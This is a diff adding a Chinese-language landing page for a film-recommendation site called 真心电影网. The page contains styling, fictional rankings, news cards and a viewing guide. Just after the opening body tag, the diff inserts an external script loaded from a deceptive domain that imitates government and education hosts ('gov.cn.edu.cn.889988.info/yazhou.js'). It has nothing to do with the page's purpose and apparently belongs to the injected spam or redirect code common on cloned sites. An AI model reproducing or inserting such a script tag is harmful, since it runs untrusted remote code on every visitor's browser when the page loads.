@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="真心电影网(zhenxindianyingwang)——用心推荐好电影。提供最新电影资讯、高分片单、类型排行与观影指南，陪你找到每一部值得一看的影片。">
+<meta name="keywords" content="真心电影网, 电影推荐, 最新电影, 高分电影, 电影资讯, 观影指南, zhenxindianyingwang">
+<meta name="author" content="真心电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="真心电影网 - 用心推荐每一部好电影">
+<meta property="og:description" content="最新电影资讯、高分片单、类型排行与观影指南，一站式电影推荐平台。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://zhenxindianyingwang-app.github.io">
+<title>真心电影网 - 用心推荐每一部好电影 | zhenxindianyingwang</title>
+<style>
+    :root{
+        --bg:#07091a;
+        --bg2:#0d1230;
+        --card:rgba(255,255,255,.05);
+        --line:rgba(255,255,255,.10);
+        --txt:#eaf0ff;
+        --sub:#9aa7cf;
+        --gold:#ffb547;
+        --cyan:#3ee0e0;
+        --pink:#ff5ca8;
+        --radius:18px;
+    }
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{
+        font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+        background:var(--bg);
+        color:var(--txt);
+        line-height:1.7;
+        overflow-x:hidden;
+    }
+    /* 动态背景 */
+    .aurora{position:fixed;inset:0;z-index:0;overflow:hidden}
+    .aurora i{position:absolute;border-radius:50%;filter:blur(80px);opacity:.35;animation:float 18s ease-in-out infinite}
+    .aurora i:nth-child(1){width:420px;height:420px;background:var(--pink);top:-120px;left:-80px}
+    .aurora i:nth-child(2){width:500px;height:500px;background:#5b6cff;bottom:-160px;right:-100px;animation-delay:-6s}
+    .aurora i:nth-child(3){width:320px;height:320px;background:var(--cyan);top:40%;left:55%;animation-delay:-11s}
+    @keyframes float{0%,100%{transform:translate3d(0,0,0) scale(1)}33%{transform:translate3d(60px,-40px,0) scale(1.15)}66%{transform:translate3d(-40px,50px,0) scale(.9)}}
+    .wrap{position:relative;z-index:1;max-width:1120px;margin:0 auto;padding:0 20px}
+
+    /* 导航 */
+    header{position:sticky;top:0;z-index:50;backdrop-filter:blur(14px);background:rgba(7,9,26,.6);border-bottom:1px solid var(--line)}
+    .nav{display:flex;align-items:center;gap:18px;height:64px}
+    .logo{font-size:20px;font-weight:800;letter-spacing:.5px;background:linear-gradient(90deg,var(--pink),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;white-space:nowrap}
+    .logo small{display:block;font-size:10px;letter-spacing:2px;color:var(--sub);-webkit-text-fill-color:var(--sub);font-weight:500}
+    .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+    .nav-links a{color:var(--sub);text-decoration:none;font-size:14px;padding:8px 12px;border-radius:10px;transition:.2s}
+    .nav-links a:hover{color:#fff;background:rgba(255,255,255,.08)}
+
+    /* 首屏 */
+    .hero{min-height:min(88vh,760px);display:flex;align-items:center;padding:60px 0}
+    .hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:50px;align-items:center;width:100%}
+    .eyebrow{display:inline-flex;align-items:center;gap:8px;font-size:13px;color:var(--gold);border:1px solid rgba(255,181,71,.35);padding:6px 14px;border-radius:30px;background:rgba(255,181,71,.08)}
+    .hero h1{font-size:clamp(34px,6vw,64px);line-height:1.1;margin:20px 0 10px;font-weight:850}
+    .hero h1 em{font-style:normal;background:linear-gradient(90deg,var(--cyan),var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}
+    .hero p{color:var(--sub);font-size:clamp(15px,2vw,18px);max-width:520px}
+    .cta{display:flex;gap:12px;margin-top:28px;flex-wrap:wrap}
+    .btn{padding:13px 26px;border-radius:12px;font-size:15px;font-weight:700;text-decoration:none;border:1px solid transparent;transition:.25s;cursor:pointer}
+    .btn-primary{background:linear-gradient(135deg,var(--pink),#7b5cff);color:#fff;box-shadow:0 10px 30px -10px rgba(255,92,168,.6)}
+    .btn-primary:hover{transform:translateY(-2px)}
+    .btn-ghost{color:var(--txt);border-color:var(--line);background:var(--card)}
+    .btn-ghost:hover{border-color:var(--cyan);color:var(--cyan)}
+    .stats{display:flex;gap:28px;margin-top:36px;flex-wrap:wrap}
+    .stat b{display:block;font-size:26px;font-weight:800}
+    .stat span{color:var(--sub);font-size:13px}
+
+    /* 胶片票根卡片 */
+    .ticket{position:relative;background:linear-gradient(160deg,rgba(255,255,255,.10),rgba(255,255,255,.03));border:1px solid var(--line);border-radius:22px;padding:26px;transform:rotate(2deg);transition:.4s}
+    .ticket:hover{transform:rotate(0) translateY(-6px)}
+    .ticket::before,.ticket::after{content:"";position:absolute;width:22px;height:22px;background:var(--bg);border-radius:50%;left:50%;transform:translateX(-50%)}
+    .ticket::before{top:-11px;border-bottom:1px dashed var(--line)}
+    .ticket::after{bottom:-11px;border-top:1px dashed var(--line)}
+    .ticket .poster{aspect-ratio:3/4;border-radius:14px;background:linear-gradient(135deg,#2a1b4e,#0e2a4a);display:flex;align-items:center;justify-content:center;font-size:40px;box-shadow:0 20px 50px -20px rgba(0,0,0,.8)}
+    .ticket h3{margin-top:18px;font-size:18px}
+    .ticket p{color:var(--sub);font-size:13px;margin-top:6px}
+
+    section{padding:80px 0}
+    .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:36px}
+    .sec-head h2{font-size:clamp(24px,4vw,38px);font-weight:800}
+    .sec-head h2 span{color:var(--cyan)}
+    .sec-head p{color:var(--sub);font-size:15px;max-width:460px}
+
+    /* 通用卡片 */
+    .grid{display:grid;gap:22px}
+    .g-4{grid-template-columns:repeat(4,1fr)}
+    .g-3{grid-template-columns:repeat(3,1fr)}
+    .g-2{grid-template-columns:repeat(2,1fr)}
+    .card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;transition:.3s;position:relative;overflow:hidden}
+    .card:hover{border-color:rgba(94,234,212,.5);transform:translateY(-4px);background:rgba(255,255,255,.07)}
+    .card .no{position:absolute;right:16px;top:12px;font-size:40px;font-weight:900;color:rgba(255,255,255,.06)}
+    .card h3{font-size:17px;margin-bottom:8px}
+    .card p{color:var(--sub);font-size:14px}
+    .tag{display:inline-block;font-size:12px;padding:3px 10px;border-radius:20px;background:rgba(62,224,224,.12);color:var(--cyan);margin:10px 6px 0 0}
+
+    /* 排行列表 */
+    .rank{display:flex;flex-direction:column;gap:12px}
+    .rank-item{display:flex;align-items:center;gap:16px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:12px 16px;transition:.25s}
+    .rank-item:hover{border-color:var(--gold);background:rgba(255,181,71,.07)}
+    .rank-item .idx{font-size:22px;font-weight:900;min-width:34px;color:var(--gold)}
+    .rank-item .idx.top{color:var(--pink)}
+    .rank-item .info{flex:1;min-width:0}
+    .rank-item .info b{display:block;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .rank-item .info small{color:var(--sub);font-size:12px}
+    .stars{color:var(--gold);font-size:13px;white-space:nowrap}
+
+    /* 类型云 */
+    .genre-cloud{display:flex;flex-wrap:wrap;gap:10px}
+    .genre{font-size:14px;padding:9px 18px;border-radius:30px;border:1px solid var(--line);background:var(--card);cursor:pointer;transition:.25s}
+    .genre:hover{color:var(--bg);background:linear-gradient(90deg,var(--cyan),var(--gold));border-color:transparent;transform:scale(1.05)}
+
+    /* 时间轴 */
+    .timeline{position:relative;padding-left:28px}
+    .timeline::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--pink),var(--cyan))}
+    .tl-item{position:relative;margin-bottom:26px}
+    .tl-item::before{content:"";position:absolute;left:-27px;top:6px;width:12px;height:12px;border-radius:50%;background:var(--cyan);box-shadow:0 0 0 4px rgba(62,224,224,.2)}
+    .tl-item b{color:var(--gold);font-size:13px;letter-spacing:1px}
+    .tl-item h4{font-size:16px;margin:2px 0 4px}
+    .tl-item p{color:var(--sub);font-size:14px}
+
+    /* 搜索 */
+    .search-box{display:flex;gap:10px;max-width:640px;margin:0 auto;flex-wrap:wrap;justify-content:center}
+    .search-box input{flex:1;min-width:220px;padding:15px 20px;border-radius:14px;border:1px solid var(--line);background:rgba(0,0,0,.25);color:var(--txt);font-size:16px;outline:none}
+    .search-box input:focus{border-color:var(--cyan)}
+
+    /* 页脚 */
+    footer{border-top:1px solid var(--line);padding:50px 0 30px;margin-top:40px}
+    .foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px}
+    .foot-grid h4{font-size:15px;margin-bottom:12px;color:var(--gold)}
+    .foot-grid a{display:block;color:var(--sub);text-decoration:none;font-size:14px;padding:4px 0}
+    .foot-grid a:hover{color:var(--cyan)}
+    .copyright{text-align:center;color:var(--sub);font-size:13px;margin-top:36px;padding-top:20px;border-top:1px solid var(--line)}
+
+    /* 回到顶部 */
+    .top{position:fixed;right:20px;bottom:24px;width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--pink),var(--cyan));color:#fff;display:flex;align-items:center;justify-content:center;text-decoration:none;font-size:20px;box-shadow:0 10px 30px -10px rgba(0,0,0,.6);z-index:40;opacity:0;pointer-events:none;transition:.3s}
+    .top.show{opacity:1;pointer-events:auto}
+
+    @media(max-width:900px){
+        .hero-grid{grid-template-columns:1fr;text-align:center}
+        .ticket{margin:0 auto;max-width:300px;transform:none}
+        .ticket:hover{transform:translateY(-6px)}
+        .hero p{margin:0 auto}
+        .cta,.stats{justify-content:center}
+        .g-4{grid-template-columns:repeat(2,1fr)}
+        .g-3,.g-2{grid-template-columns:1fr}
+        .foot-grid{grid-template-columns:1fr 1fr}
+    }
+    @media(max-width:560px){
+        .nav{height:56px;gap:10px}
+        .logo{font-size:16px}
+        .nav-links a{padding:6px 8px;font-size:13px}
+        section{padding:56px 0}
+        .g-4{grid-template-columns:1fr}
+        .foot-grid{grid-template-columns:1fr}
+        .sec-head{flex-direction:column;align-items:flex-start}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<div class="aurora" aria-hidden="true"><i></i><i></i><i></i></div>
+
+<header>
+    <div class="wrap nav">
+        <a class="logo" href="#">真心电影网<small>ZHENXIN DIANYING WANG</small></a>
+        <nav class="nav-links">
+            <a href="#home">首页</a>
+            <a href="#news">影讯</a>
+            <a href="#rank">榜单</a>
+            <a href="#genre">类型</a>
+            <a href="#guide">指南</a>
+            <a href="#about">关于</a>
+        </nav>
+    </div>
+</header>
+
+<!-- 首屏 -->
+<section id="home" class="hero">
+    <div class="wrap hero-grid">
+        <div>
+            <span class="eyebrow">🎬 用心推荐 · 每一部都值得</span>
+            <h1>找到今晚<br><em>最值得看</em>的那部电影</h1>
+            <p>真心电影网（zhenxindianyingwang）汇聚最新电影资讯、高分片单与观影指南，用真实口碑帮你省下挑片的时间，把夜晚交给好故事。</p>
+            <div class="cta">
+                <a class="btn btn-primary" href="#rank">查看今日榜单</a>
+                <a class="btn btn-ghost" href="#guide">获取观影指南</a>
+            </div>
+            <div class="stats">
+                <div class="stat"><b>12,000+</b><span>收录影片</span></div>
+                <div class="stat"><b>860+</b><span>深度影评</span></div>
+                <div class="stat"><b>98.6%</b><span>真实口碑评分</span></div>
+            </div>
+        </div>
+        <div class="ticket">
+            <div class="poster">🎟️</div>
+            <h3>今日真心推荐</h3>
+            <p>《逆向人生》· 豆瓣 8.7 · 剧情 / 悬疑</p>
+            <span class="tag">本周口碑第一</span>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目一：最新影讯 -->
+<section id="news">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <h2>最新<span>影讯</span></h2>
+                <p>院线动态、定档消息、电影节获奖与行业观察，第一时间送达。</p>
+            </div>
+            <a class="btn btn-ghost" href="#">更多影讯 →</a>
+        </div>
+        <div class="grid g-3">
+            <article class="card">
+                <span class="no">01</span>
+                <span class="tag">院线</span>
+                <h3>国庆档票房破纪录，现实题材领跑</h3>
+                <p>多部国产新片集中上映，观众口碑成为票房走势的关键变量，多部影片实现逆跌。</p>
+            </article>
+            <article class="card">
+                <span class="no">02</span>
+                <span class="tag">定档</span>
+                <h3>三部重磅大片官宣内地定档日期</h3>
+                <p>科幻、动画与犯罪类型齐发力，未来两个月排片竞争激烈，观影选择空前丰富。</p>
+            </article>
+            <article class="card">
+                <span class="no">03</span>
+                <span class="tag">电影节</span>
+                <h3>国际A类电影节主竞赛单元揭晓</h3>
+                <p>两部华语片入围角逐最高奖项，青年导演作品获得广泛关注与好评。</p>
+            </article>
+            <article class="card">
+                <span class="no">04</span>
+                <span class="tag">流媒体</span>
+                <h3>经典修复版登陆线上平台</h3>
+                <p>4K 修复让老片焕发新生，家庭影院也能享受影院级画质与音效。</p>
+            </article>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目二：高分榜单 -->
+<section id="rank" style="background:linear-gradient(180deg,transparent,rgba(255,92,168,.05),transparent)">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>真心<span>榜单</span></h2>
+            <p>综合口碑、评分与讨论热度，只留真正值得一看的片子。</p>
+        </div>
+        <div class="grid g-2">
+            <div class="card">
+                <h3>🏆 综合高分榜 · Top 5</h3>
+                <div class="rank">
+                    <div class="rank-item"><span class="idx top">1</span><div class="info"><b>逆向人生</b><small>剧情 / 悬疑 · 2026</small></div><span class="stars">★ 8.7</span></div>
+                    <div class="rank-item"><span class="idx top">2</span><div class="info"><b>海边的房间</b><small>爱情 / 文艺 · 2025</small></div><span class="stars">★ 8.5</span></div>
+                    <div class="rank-item"><span class="idx">3</span><div class="info"><b>无声的证人</b><small>犯罪 / 剧情 · 2026</small></div><span class="stars">★ 8.3</span></div>
+                    <div class="rank-item"><span class="idx">4</span><div class="info"><b>星际回响</b><small>科幻 / 冒险 · 2026</small></div><span class="stars">★ 8.1</span></div>
+                    <div class="rank-item"><span class="idx">5</span><div class="info"><b>父亲的早餐</b><small>家庭 / 喜剧 · 2025</small></div><span class="stars">★ 7.9</span></div>
+                </div>
+            </div>
+            <div class="card">
+                <h3>🔥 本周热度榜 · Top 5</h3>
+                <div class="rank">
+                    <div class="rank-item"><span class="idx top">1</span><div class="info"><b>夜行者</b><small>动作 / 犯罪 · 热议中</small></div><span class="stars">★ 7.6</span></div>
+                    <div class="rank-item"><span class="idx top">2</span><div class="info"><b>春日来信</b><small>青春 / 爱情 · 口碑发酵</small></div><span class="stars">★ 8.0</span></div>
+                    <div class="rank-item"><span class="idx">3</span><div class="info"><b>深渊之下</b><small>惊悚 / 悬疑 · 话题度高</small></div><span class="stars">★ 7.4</span></div>
+                    <div class="rank-item"><span class="idx">4</span><div class="info"><b>机器之心</b><small>科幻 / 伦理 · 争议之作</small></div><span class="stars">★ 7.8</span></div>
+                    <div class="rank-item"><span class="idx">5</span><div class="info"><b>山那边的风</b><small>纪录片 · 小而美</small></div><span class="stars">★ 8.2</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目三：类型频道 -->
+<section id="genre">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>按<span>类型</span>找片</h2>
+            <p>不知道看什么？先选心情，再选电影。</p>
+        </div>
+        <div class="genre-cloud">
+            <span class="genre">剧情</span>
+            <span class="genre">喜剧</span>
+            <span class="genre">动作</span>
+            <span class="genre">科幻</span>
+            <span class="genre">悬疑</span>
+            <span class="genre">犯罪</span>
+            <span class="genre">爱情</span>
+            <span class="genre">动画</span>
+            <span class="genre">恐怖</span>
+            <span class="genre">纪录片</span>
+            <span class="genre">文艺</span>
+            <span class="genre">家庭</span>
+            <span class="genre">战争</span>
+            <span class="genre">奇幻</span>
+            <span class="genre">音乐</span>
+        </div>
+        <div class="grid g-4" style="margin-top:32px">
+            <div class="card"><h3>🎭 剧情</h3><p>人性深处，故事为王。</p><span class="tag">2,300+ 部</span></div>
+            <div class="card"><h3>😂 喜剧</h3><p>疲惫一天，笑着结束。</p><span class="tag">1,800+ 部</span></div>
+            <div class="card"><h3>🚀 科幻</h3><p>仰望星空，脑洞大开。</p><span class="tag">960+ 部</span></div>
+            <div class="card"><h3>🕵️ 悬疑</h3><p>反转到底，真相是谁。</p><span class="tag">1,100+ 部</span></div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目四：观影指南 -->
+<section id="guide">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>观影<span>指南</span></h2>
+            <p>从入门到进阶，把"看电影"变成一门享受。</p>
+        </div>
+        <div class="grid g-2">
+            <div>
+                <div class="timeline">
+                    <div class="tl-item"><b>STEP 01</b><h4>先定心情，再定片单</h4><p>开心、难过、想动脑还是想放空？情绪是最好的选片过滤器。</p></div>
+                    <div class="tl-item"><b>STEP 02</b><h4>看评分，更要看评分人数</h4><p>高分但人数少可能是小众佳作，万人评分 8.0 以上才更稳。</p></div>
+                    <div class="tl-item"><b>STEP 03</b><h4>避开"剧透式"简介</h4><p>好电影的第一遍，值得保留未知。</p></div>
+                    <div class="tl-item"><b>STEP 04</b><h4>关掉弹幕，沉浸式观看</h4><p>前 15 分钟不玩手机，代入感会翻倍。</p></div>
+                </div>
+            </div>
+            <div class="card" style="align-self:start">
+                <h3>🔍 站内影片检索</h3>
+                <p style="margin-top:8px;color:var(--sub);font-size:14px">输入片名、导演、演员或类型，快速定位想看的电影。</p>
+                <div class="search-box" style="margin-top:18px">
+                    <input type="text" placeholder="例如：悬疑 高分 2026">
+                    <a class="btn btn-primary" href="#">搜索</a>
+                </div>
+                <div style="margin-top:20px">
+                    <span class="tag">热门搜索：剧情片</span>
+                    <span class="tag">高分冷门</span>
+                    <span class="tag">奥斯卡</span>
+                    <span class="tag">宫崎骏</span>
+                    <span class="tag">诺兰</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目五：关于 -->
+<section id="about" style="background:linear-gradient(180deg,transparent,rgba(62,224,224,.05))">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>关于<span>真心电影网</span></h2>
+            <p>我们不做流量的搬运工，只做好片的引路人。</p>
+        </div>
+        <div class="grid g-4">
+            <div class="card"><span class="no">A</span><h3>真实口碑</h3><p>拒绝水军与刷分，评分来自真实观影后的沉淀。</p></div>
+            <div class="card"><span class="no">B</span><h3>去芜存菁</h3><p>海量片库中只推荐真正值得花两小时的那些。</p></div>
+            <div class="card"><span class="no">C</span><h3>多元视角</h3><p>商业大片与小众文艺同样被认真对待。</p></div>
+            <div class="card"><span class="no">D</span><h3>持续更新</h3><p>每日更新影讯与片单，好电影永不缺席。</p></div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        <div class="foot-grid">
+            <div>
+                <a class="logo" href="#">真心电影网</a>
+                <p style="color:var(--sub);font-size:14px;margin-top:10px;max-width:300px">用心推荐每一部好电影。网址：https://zhenxindianyingwang-app.github.io</p>
+            </div>
+            <div>
+                <h4>栏目</h4>
+                <a href="#home">首页</a>
+                <a href="#news">最新影讯</a>
+                <a href="#rank">高分榜单</a>
+                <a href="#genre">类型频道</a>
+                <a href="#guide">观影指南</a>
+            </div>
+            <div>
+                <h4>类型</h4>
+                <a href="#">剧情</a>
+                <a href="#">喜剧</a>
+                <a href="#">科幻</a>
+                <a href="#">悬疑</a>
+                <a href="#">动画</a>
+            </div>
+            <div>
+                <h4>关于</h4>
+                <a href="#about">网站简介</a>
+                <a href="#">投稿合作</a>
+                <a href="#">免责声明</a>
+                <a href="#">联系我们</a>
+            </div>
+        </div>
+        <div class="copyright">
+            © 2026 真心电影网 zhenxindianyingwang · 网站网址：https://zhenxindianyingwang-app.github.io · 本文为示例演示页面，影片与数据为虚构示例，仅供学习与展示使用。
+        </div>
+    </div>
+</footer>
+
+<a class="top" id="topBtn" href="#" title="回到顶部">↑</a>
+
+<script>
+    // 回到顶部按钮
+    var topBtn=document.getElementById('topBtn');
+    window.addEventListener('scroll',function(){
+        if(window.scrollY>500){topBtn.classList.add('show');}else{topBtn.classList.remove('show');}
+    });
+    // 类型标签点击反馈
+    document.querySelectorAll('.genre').forEach(function(g){
+        g.addEventListener('click',function(){
+            document.querySelectorAll('.genre').forEach(function(x){x.style.background='';x.style.color='';});
+            g.style.background='linear-gradient(90deg,var(--cyan),var(--gold))';
+            g.style.color='var(--bg)';
+        });
+    });
+</script>
+</body>
+</html>
